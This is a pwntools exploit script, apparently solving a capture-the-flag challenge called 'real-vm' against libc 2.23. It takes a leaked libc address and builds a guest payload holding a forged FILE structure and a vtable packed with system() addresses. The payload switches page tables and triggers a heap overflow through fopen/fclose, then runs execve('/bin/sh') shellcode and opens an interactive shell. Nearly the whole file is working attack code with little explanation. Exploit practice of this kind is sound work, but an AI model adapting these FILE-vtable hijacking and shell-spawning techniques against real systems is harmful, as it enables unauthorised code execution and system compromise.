#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--libc=./libs/libc-2.23.so' real-vm
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'real-vm_patched')
context.terminal = ["tmux", "splitw", "-h"]

#context.update(terminal=["tmux", "split-window", "-h"], arch="amd64")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
libc = exe.libc
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
set follow-fork-mode child
b *main+212
b *fclose+60
c
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

io.recvuntil(b"Comrade : ")
libc_leak = int(io.recvline(False).decode(), 16)
info(f"libc leak: {hex(libc_leak)}")

libc.address = libc_leak - 0x3c48e0
info(f"libc base: {hex(libc.address)}")

# maybe find a leak, or find a way to put the fake struct into libc
rwx_addr = 0x7ffff7fe6000

shellcode = f"""
.org 0
    jmp it_s_time_to_pwn
    /* TODO do this properly lemao */
.org 0x20
    .quad 0 /* dummy1 */
    .quad 0 /* dummy2 */
    .quad 0 /* finish */
    .quad 0 /* overflow */
    .quad 0 /* undeflow */
    .quad 0 /* uflow */
    .quad 0 /* pbackfail */
    .quad 0 /* xsputn */
    .quad 0 /* xsgetn */
    .quad 0 /* seekoff */
    .quad 0 /* seekpos */
    .quad 0 /* setbuf */
    .quad 0 /* sync */
    .quad 0 /* doallocate */
    .quad 0 /* read */
    .quad 0 /* write */
    .quad 0 /* seek */
    .quad {hex(rwx_addr + 0x2000)} /* close */
    .quad 0 /* stat */
    .quad 0 /* showmanyc */
    .quad 0 /* imbue */

.org 0x1000
    .skip 0x28
    .quad 0x231
    .quad 0x3b01010101010100 /* original 0xfbad2488 (use 0xfbad2408 for rip control) */
    .quad {u64(b"/bin/sh"+bytes(1))}
    .quad {hex(libc.address)}
    .quad 0
    .quad {hex(libc.address)}
    .quad {hex(libc.address + 0x1000)}
    .quad {hex(libc.binsh())}
    .quad {hex(libc.binsh())}
    .quad {hex(libc.binsh())}
    .quad 0
    .quad 0
    .quad 0
    .quad 0
    .quad {hex(libc.address + 0x3c5540)}
    .quad 1 /* orginal fd was 6 */
    .quad 0
    .quad 0
    .quad {hex(libc.address + 0x3c5f00)}
    .quad {hex(-1)}
    .quad 0
    .quad 0xcafebabe
    .quad 0
    .quad 0
    .quad 0
    .quad 0
    .quad 0
    .quad 0
    vtable:
    .quad {hex(libc.sym._IO_str_jumps)} /* <- _IO_file_jumps */
    /* .quad {hex(libc.sym.system)} /* <- evil _IO_file_jumps */
    .quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
.quad {hex(libc.sym.system)}
    .quad {hex(libc.sym.system)}
    .quad {hex(libc.sym.system)}
    .quad {hex(libc.sym.system)}
    .quad {hex(libc.sym.system)}
    .quad {hex(libc.sym.system)}

it_s_time_to_pwn:
    mov rax, 0x3000 /* change page table */
    mov cr3, rax
    mov rbx, 0x3000
    mov [rbx + 0x08], rax /* trigger malloc of a 0x20 bytes' chunk */
    mov [rbx + 0x00], rax /* trigger fopen (malloc struct FILE) */
    mov rax, {(0x1000 << 32) | (0x28 + 0x230)} /* trigger heap overflow */
    mov [rbx + 0x10], rax
    mov [rbx + 0x18], rax
    hlt

.org 0x2000
    mov rax, {u64(b"/bin/sh"+bytes(1))}
    push rax
    mov rdi, rsp
    xor esi, esi
    xor edx, edx
    mov eax, {int(constants.SYS_execve)}
    syscall

.org 0x3000
/* page table DO NOT TOUCH */
    .quad 0x3003
    .quad 0x1003
    .quad 0x0
    .quad 0x16003
"""

shellcode = asm(shellcode)
while len(shellcode) < 0x3ff0:
    shellcode+=p64(libc.sym.system)

io.sendlineafter(b"Code Length\n", f"{len(shellcode)}".encode())
io.sendlineafter(b"Code Comrade\n", shellcode)

io.interactive()
